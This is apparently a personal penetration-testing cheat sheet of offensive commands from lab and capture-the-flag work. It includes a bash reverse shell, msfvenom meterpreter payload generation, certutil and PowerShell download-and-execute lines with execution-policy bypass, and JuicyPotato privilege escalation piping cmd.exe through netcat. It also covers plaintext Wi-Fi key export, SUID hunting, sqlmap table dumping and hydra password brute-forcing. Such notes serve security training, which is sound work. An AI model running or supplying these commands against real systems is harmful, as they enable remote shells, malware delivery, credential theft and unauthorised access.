# Commands
Some commands that I use and hard to remember

## Check Permissions
```
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

## Reverse Shell
```
bash -i >& /dev/tcp/10.10.15.113/1337 0>&1
```

## Msfvenom
```
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.15.94 lport=1337 -f php > nothing.php 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.168 LPORT=1974 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.225 LPORT=1974 -f exe > shell.exe
```

## Python
```
python -c "import pty; pty.spawn('/bin/bash')"
python3 -c 'import sys; print("\n".join(sys.path))'

__import__("os").system("ls -l")
__import__("pty").spawn("/bin/bash")
__import__("subprocess").call("ls")
```

## Misc
```
juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe <<ip>> 1337"
certutil.exe -urlcache -split -f http://10.10.15.117/shell.exe shell.exe
netsh wlan export profile key=clear
```

## For Shared Folder
```
sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other
```

## NFS
```
mount -t nfs 10.10.67.240:/var /mnt/tmp
```

## PowerShell
```
powershell.exe -a 'Invoke-WebRequest http://10.10.14.10/shell.exe -OutFile C:\Users\Public\'
powershell.exe -a '-NoProfile -Command wget http://10.10.14.10/shell.exe'
powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile("http://10.10.14.8/xc.exe", "C:\Users\Public\") 
powershell.exe -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.14.62/shell.exe')|iex"
powershell.exe -a 'Get-Childitem -Path C:/ -Include /media/1036/shell.exe -File -Recurse -ErrorAction SilentlyContinue'
```

## unzip winrar recursively
```
while [ "`find . -type f -name '*.zip' | wc -l`" -gt 0 ]; do find -type f -name "*.zip" -exec unzip -- '{}' \; -exec rm -- '{}' \;; done
```

## sqlmap
```
sqlmap -u "http://192.168.253.21" --data="__VIEWSTATE=QORu5y5LymA%2FZLvV5I%3D&TextBox1=asd&TextBox2=asd&sender=SEND" -p "TextBox1" --dbms="MSSQL"
sqlmap -r attack.txt --dbms=mysql -D Canakkale -T Users --dump
```

## Web Fuzzers
```
gobuster dir -u http://10.10.10.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,asp,aspx                                                          
wfuzz  -c -w /usr/share/dirb/wordlists/big.txt http://10.10.10.168:8080/FUZZ

ffuf -u "http://1.1.1.1/FUZZ" -w ~/gitClones/SecLists/Discovery/Web-Conten
t/directory-list-2.3-medium.txt -e .php,.txt
```

## Hydra
```
hydra https://challenges.neverlanctf.com:1160/ http-post-form "login.php:username=^USER^&password=^PASS^:incorrect" -l "admin" -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-attack.txt

hydra -l "admin" 10.10.10.180 http-post-form "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin:\{"username"\:"^USER^","password"\:"^PASS^"\}:failed" -P /usr/share/wordlists/rockyou.txt
```

## awk
```
cat command.txt | awk 'length($1)==4 { print $1 } '
```

## fish
remove everything except file1
```
rm (string match -rv '^file1$' -- *)
```
